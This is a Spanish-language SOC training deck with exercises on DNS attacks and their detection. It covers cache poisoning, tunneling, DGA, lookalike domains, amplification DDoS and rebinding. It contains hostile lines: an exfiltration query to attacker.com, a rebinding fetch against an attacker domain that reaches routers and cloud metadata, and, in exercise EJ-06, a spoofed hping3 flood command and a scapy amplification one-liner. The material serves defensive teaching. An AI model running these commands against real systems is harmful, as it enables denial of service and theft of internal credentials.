¿Qué es DNS?

El directorio telefónico de Internet

DNS (Domain Name System) traduce nombres de dominio legibles por humanos —como google.com— a direcciones IP que los routers pueden enrutar. Sin DNS, tendríamos que memorizar IPs para cada servicio.

Puerto y protocolo: UDP/53 para consultas (≤512 bytes). TCP/53 para respuestas grandes o transferencias de zona (AXFR).

DNS opera de forma jerárquica y distribuida: no hay un único servidor que sepa todo, sino una cadena de servidores que colaboran para resolver cada nombre.

2 / 11

Cómo funciona: el flujo de resolución

5 pasos desde la pregunta hasta la respuesta

Cliente (browser) ↓ "¿Cuál es la IP de example.com?" Resolver recursivo (DNS del ISP o 8.8.8.8) ↓ Si no tiene en caché → pregunta al Root Root Server (.) ↓ "Pregunta al servidor TLD de .com" TLD Server (.com) ↓ "Pregunta al servidor autoritativo" Servidor Autoritativo (example.com) ↓ "La IP es 93.184.216.34, TTL 3600s" Resolver → guarda en caché → responde al cliente
TTL (Time To Live): cuántos segundos puede el resolver guardar la respuesta en caché antes de volver a preguntar. Un TTL bajo = más tráfico DNS.
3 / 11

Tipos de registros DNS

Los más relevantes para un SOC

  • A — Nombre → IPv4 (el más común)
  • AAAA — Nombre → IPv6
  • CNAME — Alias → otro nombre
  • MX — Servidor de correo
  • TXT — Texto arbitrario (SPF, DKIM, verificación)
  • PTR — IP → Nombre (DNS inverso, útil en forensia)
  • NS — Servidor autoritativo de la zona
  • SOA — Start of Authority (metadatos de la zona)
Relevancia SOC: los registros TXT y consultas excesivas a subdominios son señales comunes de DNS Tunneling y C2 sobre DNS.
4 / 11

Ataque 1: DNS Spoofing / Cache Poisoning

El atacante falsifica la respuesta del resolver

El atacante envía una respuesta DNS falsa al resolver antes de que llegue la legítima, insertando su IP en la caché. Todas las consultas futuras a ese dominio se redirigen al atacante.

Mecanismo: Kaminsky Attack (2008) — el atacante inunda el resolver con respuestas falsas para diferentes subdominios hasta que una coincide con el ID de transacción correcto.

Cómo detectarlo en SOC:

  • Respuestas DNS con TTL anormalmente alto o bajo
  • IP de respuesta en rango no esperado para ese dominio
  • Múltiples respuestas para la misma consulta (race condition)
  • Logs de Zeek: dns.log con rcode=0 pero IP inesperada
5 / 11

Ataque 2: DNS Tunneling

Exfiltración de datos usando consultas DNS

El atacante codifica datos en subdominios de su dominio controlado. El malware en la víctima hace consultas DNS normales que pasan firewalls — pero llevan datos exfiltrados.

Víctima → consulta: SGVsbG8gV29ybGQ.attacker.com DNS → respuesta legítima (IP del servidor C2) El servidor C2 decodifica "Hello World" del subdominio
IOCs: subdominios de alta entropía (Base64/hex), longitud de consulta >50 caracteres, volumen anormal de consultas TXT al mismo dominio base.

Herramientas atacantes: dnscat2, iodine, dns2tcp.

6 / 11

Ataque 3: DGA (Domain Generation Algorithm)

El malware genera dominios pseudo-aleatorios para evitar bloqueos

El malware y el servidor C2 usan el mismo algoritmo (DGA) con una semilla compartida (fecha, etc.) para generar cientos de dominios. Solo uno de ellos estará activo — pero el defensor no sabe cuál.

Ejemplo DGA (pseudocódigo):
seed = fecha_actual()
dominio = sha256(seed + contador)[:12] + ".com"
→ genera: xk3mq7pzralc.com, 9bv2nwtqfeld.com...

Detección: alta entropía del nombre de dominio, ausencia de historia de resolución, NXDomain masivo (el malware prueba todos los dominios DGA buscando el activo).

7 / 11

Ataque 4: Dominios maliciosos y Phishing

Typosquatting, homoglifo y dominios lookalike

El atacante registra dominios similares al legítimo para engañar a usuarios o herramientas de seguridad.

  • Typosquatting: goggle.com, facbook.com
  • Homoglifo: gооgle.com (la "o" es cirílica)
  • Lookalike: paypa1.com, secure-bankofamerica-login.com
  • Fast Flux: el dominio C2 cambia su IP cada pocos segundos para evadir bloqueos por IP
SOC: integrar feeds de threat intel (AlienVault, Cisco Umbrella) para detección en tiempo real. Zeek + reglas Suricata para lookalike domains.

Detección y mitigación

Resumen operativo para SOC

  • 🔒 DNSSEC — firma criptográfica de registros DNS (previene spoofing)
  • 📊 DNS Sinkholing — redirigir dominios maliciosos conocidos a un servidor controlado
  • 📈 Análisis de entropía — alta entropía en subdominio = sospechoso
  • 🔢 Volumen de NXDOMAIN — spikes = posible DGA o reconocimiento
  • ⏱️ TTL anormalmente bajo — posible Fast Flux
  • 📏 Longitud de consulta >50 chars — posible tunneling
  • 🌐 RPZ (Response Policy Zone) — bloquear dominios maliciosos en el resolver
Regla Sigma básica — DGA Detection:
selection: dns.query|re: '^[a-z0-9]{10,}\.com$'
condition: selection AND NOT dns.answers

Ataque 7: DNS Amplification DDoS

Usar resolvers DNS abiertos como amplificadores de tráfico

El atacante spoofea la IP origen (víctima) y envía consultas DNS a miles de resolvers abiertos. Cada resolver responde a la víctima con paquetes mucho más grandes. Factor típico: ×50-100x. Una consulta de 40 bytes genera respuestas de 4.000 bytes.

FLUJO DEL ATAQUE:

Atacante (IP: 1.2.3.4, spoofeando 203.0.113.10):
  → Envía: DNS ANY isc.org?  [40 bytes, src=203.0.113.10]
  → A: 10.000 resolvers DNS abiertos

Cada resolver responde a la VICTIMA:
  → 203.0.113.10 recibe: 4.096 bytes de respuesta
  → ×10.000 resolvers = 40 GB/s sobre la víctima

FACTOR DE AMPLIFICACIÓN POR TIPO DE QUERY:
  ANY     → ×50-100x  (mayor, pero cada vez más bloqueado)
  TXT     → ×20-40x   (registros SPF/DKIM largos)
  RRSIG   → ×30-60x   (DNSSEC signatures)
  MX      → ×10-20x

DETECCIÓN:
  Zeek dns.log: mismo query repetido miles de veces con src IPs distintas
  NetFlow: volumen DNS saliente inusual desde resolver
  Alerta: resolver respondiendo a IPs que no consultaron

MITIGACIÓN:
  Resolver: BCP38 — filtrar paquetes con src IP spoofed
  ISP: uRPF (Unicast Reverse Path Forwarding)
  Resolver: Response Rate Limiting (RRL) en BIND/Unbound
  Deshabilitar consultas ANY en resolvers públicos

MITRE ATT&CK: T1498.002 — Network DoS: Reflection Amplification

Ataque 8: DNS Rebinding

Bypass de Same-Origin Policy usando TTL corto

El atacante controla un dominio con TTL muy bajo. Primero resuelve a IP pública (para que el navegador cargue la página). Luego cambia la resolución a una IP interna. El navegador sigue confiando en el dominio y ejecuta peticiones al interior de la red.

FLUJO DEL ATAQUE:

FASE 1 — Víctima visita evil-rebind.com:
  DNS query: evil-rebind.com → 1.2.3.4 (IP pública del atacante, TTL=1s)
  Navegador carga página con JavaScript malicioso

FASE 2 — TTL expira (1 segundo), DNS cambia:
  DNS query: evil-rebind.com → 192.168.1.1 (router interno!)
  Navegador: "evil-rebind.com sigue siendo el mismo dominio"
  → Same-Origin Policy satisfecha

FASE 3 — JavaScript hace fetch al "mismo dominio":
  fetch("http://evil-rebind.com/admin")
  → Navegador resuelve: 192.168.1.1/admin (router interno)
  → Respuesta enviada al servidor del atacante

OBJETIVOS COMUNES:
  192.168.1.1          → Panel admin del router (cambiar DNS)
  10.0.0.x:8080        → APIs internas sin autenticación
  169.254.169.254      → AWS/GCP/Azure metadata (tokens IAM)
  localhost:6379       → Redis sin auth → RCE

DETECCIÓN:
  DNS: TTL < 5 segundos en dominios externos → sospechoso
  Proxy: peticiones HTTP a IPs RFC1918 desde el navegador
  EDR: proceso browser conectando a 169.254.169.254

MITIGACIÓN:
  DNS rebind protection en routers (bloquear RFC1918 en DNS externo)
  Bind a localhost solo — no exponer servicios internos a 0.0.0.0
  Cabecera Host validation en APIs internas

MITRE ATT&CK: T1557 — Adversary-in-the-Middle · T1090.001 — Proxy: Internal

EJ-01 ¿Qué hace un resolver recursivo? Fácil

Explica con tus palabras qué ocurre cuando escribís bank.com en el browser y tu sistema operativo no tiene la respuesta en caché local. Describí todos los actores involucrados y en qué orden participan.

1. El SO consulta su caché local → no está. 2. Envía consulta UDP/53 al resolver configurado (ej: 8.8.8.8). 3. El resolver consulta un Root Server (13 grupos en todo el mundo). 4. El Root responde: "pregunta al TLD .com". 5. El resolver consulta el TLD .com → responde: "pregunta al NS de bank.com". 6. El resolver consulta el NS autoritativo de bank.com. 7. Recibe respuesta con la IP y TTL → la guarda en caché. 8. Retorna la IP al cliente.
EJ-02 Registros DNS para SOC Fácil

Un analista encontró en un incidente que el malware hace consultas de tipo TXT repetitivas a c2domain.net. ¿Por qué usaría TXT y no A? ¿Qué ventaja le da al atacante?

Los registros TXT permiten datos arbitrarios de hasta 255 bytes por string. El atacante usa TXT para: - Recibir comandos del C2 (el malware lee el TXT y lo interpreta como instrucción) - Exfiltrar datos más largos que los subdominios permiten - Pasar desapercibido: TXT es común en SPF, DKIM, verificaciones Google/AWS Ventaja adicional: muchos firewalls permiten todo tráfico DNS (port 53 UDP) sin inspección profunda de contenido.

EJ-06 DNS Amplification: calcula el factor de amplificación Medio

Un atacante envía queries DNS tipo ANY con IP origen spoofed (la víctima). Cada query pesa 40 bytes. Los resolvers abiertos responden con 4.000 bytes cada uno. El atacante usa 500 resolvers. ¿Cuánto tráfico recibe la víctima por segundo si el atacante dispara 1.000 queries/s? ¿Cuál es el factor de amplificación? ¿Qué comando usaría el atacante con hping3?

FACTOR: 4.000 / 40 = ×100x de amplificación TRÁFICO EN VÍCTIMA: 500 resolvers × 4.000 bytes × 1.000 queries/s = 2.000.000.000 bytes/s = 2 Gbps COMANDO (hping3): hping3 --udp --spoof [victim_ip] -p 53 --flood [resolver_ip] O con scapy: send(IP(src="victim",dst="resolver")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qtype="ANY"))) MITIGACIÓN EN EL RESOLVER: - Deshabilitar queries tipo ANY - Implementar Response Rate Limiting (RRL): max-udp-size 512 - Bloquear consultas de IPs externas (solo recursión para IPs internas)
EJ-07 DNS Rebinding: ¿por qué el navegador confía? Difícil

Explicá paso a paso cómo el DNS Rebinding viola la Same-Origin Policy del navegador. ¿Qué condición es necesaria para que el ataque funcione (TTL)? ¿Qué recursos internos podría obtener un atacante que controla un dominio con TTL=1s? ¿Cómo se puede mitigar desde el lado del resolver DNS?

POR QUÉ FUNCIONA: 1. El navegador implementa Same-Origin Policy por (protocolo, dominio, puerto) 2. El atacante controla evil.com con TTL=1s 3. Primera resolución: evil.com → 1.2.3.4 (IP pública real del atacante) 4. El usuario visita evil.com — carga JS malicioso 5. TTL expira (1 segundo), el atacante cambia en su servidor DNS: evil.com → 192.168.1.1 6. El JS hace fetch("http://evil.com/admin") — el navegador resuelve evil.com de nuevo 7. Ahora evil.com → 192.168.1.1 (router del usuario) 8. La petición llega al router — SOP no se viola porque el dominio es el mismo (evil.com) 9. La respuesta del router llega al JS del atacante CONDICIÓN NECESARIA: TTL muy bajo (≤1s) + JavaScript activo en el navegador RECURSOS EN RIESGO: - Router admin (192.168.1.1) → cambiar DNS de toda la red - AWS metadata (169.254.169.254) → robo de credenciales IAM - APIs internas (10.x.x.x) → exfiltración de datos corporativos MITIGACIONES: - DNS rebind protection en el resolver (pi-hole, unbound): rechaza respuestas con IPs RFC1918 - No exponer servicios internos en 0.0.0.0 sin auth - HTTPS + validación de certificado (no ayuda si usamos HTTP interno)
